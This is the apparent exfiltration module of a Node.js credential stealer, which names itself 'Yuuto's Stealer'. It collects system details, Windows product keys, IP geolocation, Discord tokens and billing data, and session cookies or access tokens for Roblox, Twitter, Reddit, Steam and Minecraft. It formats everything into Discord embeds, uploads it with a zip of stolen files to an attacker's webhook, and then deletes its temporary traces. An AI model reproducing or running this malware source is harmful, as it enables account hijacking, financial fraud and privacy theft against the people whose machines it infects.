const { webhook } = require('../config');
const { isValidURL, codeBlock, code } = require('../util/string');
const axios = require('axios');
const { join, sep } = require('path');
const os = require('os');
const fs = require('fs');
const { tempFolder, startTime } = require('../index');
const FormData = require('form-data');
const { rmSync, readFileSync } = require('fs');
const { userAgent } = require('../config');
const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar, usernameFormat } = require('../util/discord-account');
const { sleep } = require('../util/general');
const { getNameAndVersion } = require('../util/os');
const { getTempFolder } = require('../util/init');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const json = async (zipFile) => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const discordAccountInfo = JSON.parse(readFileSync(join(getTempFolder(), 'Discord.json')).toString());
  const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());

  const computerInfoFields = [
    ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB'],
    ['💾 CPUs', [...new Set(os.cpus().map(cpu => cpu.model.trim()))].join(', ')],
    ['👨 Name', code(os.hostname())],
    ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
    ['🥷 Username', code(os.userInfo().username)],
    ['🔢 OS version', getNameAndVersion().name + ' ' + getNameAndVersion().version],
    ['🔑 Product Key', code(require('./product-key').productKey)],
    ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
  ];
  const ipInfoFields = [
    ['🌐 IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
    ['🗺️ Location', `[${code(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
    ['ISP', code(await ipInfo('isp'))],
    ['🏴 Country', await ipInfo('country') + ' :flag_' + (await ipInfo('countryCode')).toLowerCase() + ':'],
  ];

  const embeds = [];
  embeds.push({
    description: 'Taken ' + Math.floor((Date.now() - startTime) / 1000) + ' seconds',
    fields: [
      { name: '💻 Computer Info', value: computerInfoFields.map(i => `${i[0]}: ${i[1]}`).join('\n'), inline: true },
      { name: 'IP Info', value: ipInfoFields.map(i => `${i[0]}: ${i[1]}`).join('\n'), inline: true },
    ]
  });

  const fieldsMap = f => ({ name: f[0], value: f[1], inline: typeof f[2] !== 'undefined' ? f[2] : true });

  if (discordAccountInfo.accounts?.length >= 1) {
    for (const account of discordAccountInfo.accounts) {
      const haveNitro = account.premium_type !== 0;
      let nitroSubscriptionEnd = 0;
      async function getNitroEnd() {
        try {
          const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
            headers: { Authorization: account.token, 'User-Agent': userAgent }
          });
          nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
        } catch (err) {
          await sleep((err.data?.response?.retry_after * 1000) + 500);
          await getNitroEnd();
        }
      }
      if (haveNitro) await getNitroEnd();

      embeds.push({
        description: `Token: ${codeBlock(account.token)}`,
        author: {
          name: usernameFormat(account.global_name, account.username, account.discriminator),
          icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator),
          url: `https://discord.com/users/${account.id}`
        },
        fields: [
          ['🆔 ID', code(account.id)],
          ['📜 Bio', account.bio],
          ['🌍 Locale', code(account.locale)],
          ['🔞 NSFW Allowed', account.nsfw_allowed],
          ['🔐 MFA Enabled', account.mfa_enabled],
          ['✉️ Email', account.email ? code(account.email) : 'No Email'],
          ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
          ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + (haveNitro ? ` (ends <t:${nitroSubscriptionEnd}:R>)` : '')],
          ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
        ].map(fieldsMap),
        color: account.accent_color,
        thumbnail: {
          url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
        },
        footer: {
          text: `Found in ${account.source.replace(account.source[0], account.source[0].toUpperCase())}`
        }
      });
    }
  }

  if (discordAccountInfo.billing?.length >= 1) {
    discordAccountInfo.billing.forEach(billing => embeds.push({
      title: `Discord Account - Billing - ${billingType(billing.type)}`,
      fields: (billing.type === 1 ? [
        ['👨 Name', billing.billing_address.name],
        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
        ['🔚 Ends in', code(billing.last_4)],
        ['®️ Brand', billing.brand],
        ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
      ] : [
        ['👨 Name', billing.billing_address.name],
        ['✉️ Email', code(billing.email)],
        ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
      ]).map(fieldsMap)
    }));
  }

  if (discordAccountInfo.gifts?.length >= 1) {
    embeds.push({
      title: 'Discord Promotions',
      description: discordAccountInfo.gifts.map(gift => {
        return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
      }).join('\n')
    });
  }

  if (fs.existsSync(join(tempFolder, 'Roblox.json'))) {
    const robloxInfo = JSON.parse(fs.readFileSync(join(tempFolder, 'Roblox.json')).toString());

    embeds.push({
      author: {
        name: robloxInfo.UserName,
        icon_url: robloxInfo.ThumbnailUrl,
        url: `https://www.roblox.com/users/${robloxInfo.UserID}/profile`
      },
      fields: [
        ['💎 Robux Balance', `${robloxInfo.RobuxBalance} Robux`],
        ['👾 Friends', robloxInfo.friendsCount || 'Unknown'],
        ['🍪 Cookie', codeBlock(robloxInfo.cookie)]
      ].map((f, i) => ({ name: f[0], value: f[1], inline: i !== 2 })),
      thumbnail: {
        url: robloxInfo.ThumbnailUrl
      },
      footer: {
        text: `Roblox account found in ${robloxInfo.source}`
      }
    });
  }

  if (fs.existsSync(join(tempFolder, 'Twitter.json'))) {
    const profile = JSON.parse(fs.readFileSync(join(tempFolder, 'Twitter.json')).toString());

    embeds.push({
      author: {
        name: `${profile.name} (@${profile.screen_name})`,
        icon_url: profile.profile_image_url_https,
        url: `https://twitter.com/${profile.screen_name}`
      },
      fields: [
        ['📜 Bio', profile.description.replaceAll(/@(\w{1,15})/gi, '[@$1](https://twitter.com/$1)')],
        ['Followers', profile.followers_count],
        ['Following', profile.friends_count],
        ['🐦 Tweets', profile.statuses_count],
        ['🗺️ Location', profile.location || 'No location set'],
        ['🔗 URL', profile.url || 'No URL set'],
        ['🎂 Birthday date', `${profile.extended_profile.birthdate.day}/${profile.extended_profile.birthdate.month}/${profile.extended_profile.birthdate.year}`],
        ['➕ Account created', `<t:${Math.floor(new Date(profile.created_at).getTime() / 1000)}>`],
        ['✅ Verified?', profile.verified],
        ['🍪 Cookie', codeBlock(profile.cookie), false]
      ].map(fieldsMap),
      thumbnail: {
        url: profile.profile_image_url_https
      },
      footer: {
        text: `Twitter account found in ${profile.source}`
      }
    });
  }

  if (fs.existsSync(join(tempFolder, 'Reddit.json'))) {
    const account = JSON.parse(fs.readFileSync(join(tempFolder, 'Reddit.json')).toString());

    embeds.push({
      author: {
        name: account.name,
        icon_url: account.icon_img,
        url: `https://www.reddit.com/user/${account.name}`
      },
      fields: [
        ['🗨️ Comment Karma', account.comment_karma],
        ['💥 Total Karma', account.total_karma],
        ['🪙 Coins', account.coins],
        ['⚔️ Is Mod?', account.is_mod],
        ['🥇 Is Gold?', account.is_gold],
        ['➕ Account created', `<t:${account.created_utc}>`],
        ['✉️ Email address', code(account.email)],
        ['🍪 Cookie', codeBlock(account.cookie), false]
      ].map(fieldsMap),
      thumbnail: {
        url: account.icon_img
      },
      footer: {
        text: `Reddit account found in ${account.source}`
      }
    });
  }

  if (fs.existsSync(join(tempFolder, 'Minecraft Accounts.json'))) {
    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Minecraft Accounts.json')).toString());

    accounts.forEach(account => {
      embeds.push({
        author: {
          name: account.minecraftProfile.name,
          icon_url: `https://crafatar.com/avatars/${account.minecraftProfile.id}?size=32`,
          url: `https://namemc.com/profile/${account.minecraftProfile.name}`
        },
        fields: [
          ['🔑 Access Token', account.accessToken ? code(account.accessToken) : 'Unknown'],
          ['🎮 Type', account.type || 'Unknown'],
        ].map(fieldsMap),
        thumbnail: {
          url: `https://crafatar.com/avatars/${account.minecraftProfile.id}`
        },
        footer: {
          text: `Minecraft account found in ${account.source} client`
        }
      });
    });
  }

  if (fs.existsSync(join(tempFolder, 'Steam.json'))) {
    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));

    accounts.forEach(({ cookie, cookieSource, accountId, accountInfo, games, level }) => {
      const gamesListUrl = `${accountInfo.players[0].profileurl}games/?tab=all`;
      const gamesListMd = `[Click here for the full list](${gamesListUrl})\n`;
      const gamesList = (games) => {
        const filters = {
          link: game => `[${game.name}](https://store.steampowered.com/app/${game.appid})`,
          text: game => game.name
        };
        const length = (filter) => games.map(filters[filter]).join(', ').length;
        const maxLength = 1024 - gamesListMd.length;

        if (length('link') > maxLength && length('text') > maxLength) {
          return `Too many games to show here, or private. Full list: ${gamesListUrl}`;
        } else if (length('link') < maxLength) {
          return gamesListMd + games.map(filters.link).join(', ');
        } else if (length('link') > maxLength && length('text') < maxLength) {
          return gamesListMd + games.map(filters.text).join(', ');
        }
      };
      const embed = {
        author: {
          name: accountInfo.players[0].personaname,
          icon_url: accountInfo.players[0].avatar,
          url: accountInfo.players[0].profileurl
        },
        fields: [
          ['🆔 Steam ID', code(accountId)],
          ['➕ Account Created', `<t:${accountInfo.players[0].timecreated}>` || 'Unknown'],
          ['🪙 Level', level.player_level?.toString() || 'Private'],
          ['🍪 Cookie', cookie ? codeBlock(cookie) : 'Not Found'],
          [`🎮 Games Owned (${games.game_count})`, gamesList(games.games), false]
        ].map(fieldsMap),
        thumbnail: {
          url: accountInfo.players[0].avatarfull
        }
      };
      if (cookie && cookieSource) embed.footer = { text: `Cookie found in ${cookieSource}` };

      embeds.push(embed);
    });
  }

  return {
    content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
    username: 'Yuuto\'s Stealer | https://github.com/JustYuuto/Yuuto-Stealer',
    attachments: [{
      id: 0,
      filename: zipFile,
      content_type: 'application/zip',
      url: `attachment://${zipFile}`,
    }]
  };
};

const send = async (zipFile) => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(zipFile));
  data.append('payload_json', JSON.stringify(await json(zipFile?.split(sep)?.pop())));

  const deleteFiles = async () => {
    try {
      await sleep(1000);
      rmSync(tempFolder, { recursive: true });
    } catch (e) {
      await deleteFiles();
    }
  };
  try {
    await axios.post(webhook.url, data, {
      headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
    });
    await deleteFiles();
  } catch (err) {
    await sleep((err.response?.data?.retry_after * 1000) + 500);
    await send(zipFile);
  }
};

module.exports = send;
